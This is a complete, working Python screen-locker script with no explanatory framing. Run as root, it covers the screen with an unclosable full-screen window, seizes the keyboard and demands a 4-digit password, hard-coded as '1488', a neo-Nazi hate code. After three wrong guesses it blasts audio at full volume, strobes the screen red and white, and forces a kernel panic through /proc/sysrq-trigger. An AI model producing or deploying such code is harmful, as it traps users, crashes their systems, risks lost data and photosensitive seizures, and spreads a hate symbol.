#!/usr/bin/env python3
import os, sys, time, threading, subprocess, queue
from Xlib import X, XK
from Xlib.display import Display
import tkinter as tk

PASSWORD = "1488"
MAX_ATTEMPTS = 3
attempts_left = MAX_ATTEMPTS
input_buffer = ""

gui_queue = queue.Queue()

def play_loud_sound():
    subprocess.run(["amixer", "set", "Master", "100%"], capture_output=True)
    subprocess.run(["aplay", "/usr/share/sounds/alsa/Front_Center.wav"], capture_output=True)

def trigger_kernel_panic():
    with open("/proc/sysrq-trigger", "w") as f:
        f.write("c")

class LockGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Lock")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)
        self.root.configure(bg='black')
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)

        self.header = tk.Label(self.root, text="YOU ARE LOCKED. GUESS 4-DIGIT PASSWORD",
                               fg='green', bg='black', font=("Courier", 24, "bold"))
        self.header.pack(pady=30)

        self.attempts_label = tk.Label(self.root, text=f"ATTEMPTS LEFT: {attempts_left}",
                                       fg='green', bg='black', font=("Courier", 16))
        self.attempts_label.pack(pady=10)

        self.input_display = tk.Label(self.root, text="> ",
                                      fg='green', bg='black', font=("Courier", 18))
        self.input_display.pack(pady=10)

        self.keypad = tk.Label(self.root, text="1 2 3\n4 5 6\n7 8 9\n   0",
                               fg='green', bg='black', font=("Courier", 16))
        self.keypad.pack(pady=20)

    def update_screen(self):
        self.attempts_label.config(text=f"ATTEMPTS LEFT: {attempts_left}")
        stars = "*" * len(input_buffer)
        self.input_display.config(text=f"> {stars}")

    def flash_screen(self):
        for i in range(10):
            color = 'red' if i % 2 == 0 else 'white'
            self.root.configure(bg=color)
            self.root.update()
            time.sleep(0.1)
        self.root.configure(bg='black')
        self.root.update()

    def cleanup(self):
        self.root.destroy()

def keyboard_grabber(disp):
    global attempts_left, input_buffer
    root_win = disp.screen().root
    root_win.grab_keyboard(True, X.GrabModeAsync, X.GrabModeAsync, X.CurrentTime)
    disp.flush()

    while True:
        event = disp.next_event()
        if event.type == X.KeyPress:
            keysym = disp.keycode_to_keysym(event.detail, 0)
            if keysym == XK.XK_Return:
                if input_buffer == PASSWORD:
                    gui_queue.put("quit")
                    break
                else:
                    input_buffer = ""
                    attempts_left -= 1
                    gui_queue.put("update")
                    if attempts_left <= 0:
                        gui_queue.put("failure")
                        break
            elif keysym == XK.XK_BackSpace:
                input_buffer = input_buffer[:-1]
                gui_queue.put("update")
            elif keysym in (XK.XK_0, XK.XK_1, XK.XK_2, XK.XK_3, XK.XK_4,
                            XK.XK_5, XK.XK_6, XK.XK_7, XK.XK_8, XK.XK_9):
                if len(input_buffer) < 4:
                    input_buffer += chr(keysym)
                    gui_queue.put("update")
        elif event.type == X.KeyRelease:
            pass

    root_win.ungrab_keyboard(X.CurrentTime)
    disp.close()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run as root (sudo).")
        sys.exit(1)

    gui = LockGUI()
    disp = Display()

    xlib_thread = threading.Thread(target=keyboard_grabber, args=(disp,), daemon=True)
    xlib_thread.start()

    def process_gui_queue():
        try:
            while True:
                msg = gui_queue.get_nowait()
                if msg == "quit":
                    gui.cleanup()
                    sys.exit(0)
                elif msg == "update":
                    gui.update_screen()
                elif msg == "failure":
                    gui.update_screen()
                    threading.Thread(target=play_loud_sound, daemon=True).start()
                    gui.flash_screen()
                    threading.Timer(5.0, trigger_kernel_panic).start()
        except queue.Empty:
            pass
        gui.root.after(50, process_gui_queue)

    process_gui_queue()
    gui.root.mainloop()
